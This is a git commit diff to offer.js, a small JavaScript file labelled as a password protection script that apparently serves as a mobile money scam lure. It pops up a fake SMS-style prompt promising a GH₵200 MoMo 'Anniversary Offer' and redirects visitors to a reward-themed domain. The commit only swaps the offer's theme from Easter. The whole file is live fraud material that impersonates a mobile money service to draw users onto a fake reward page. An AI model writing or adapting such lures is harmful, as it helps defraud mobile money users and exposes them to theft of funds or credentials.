7109e4257815c6ed1ad50fea53a09eef4587ee24
lagboyme <lagboy33+me@gmail.com>
2025-04-22 23:39:26 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'GH₵200'
-password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive GH₵200 MoMo Easter Offer, Kindly Press OK to PROCEED ','GH₵200');
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive GH₵200 MoMo Anniversary Offer, Kindly Press OK to PROCEED ','GH₵200');
 if (password != 'GH₵200') {
 location.href='https://momo-reward.goprogram.xyz/easter';
 }
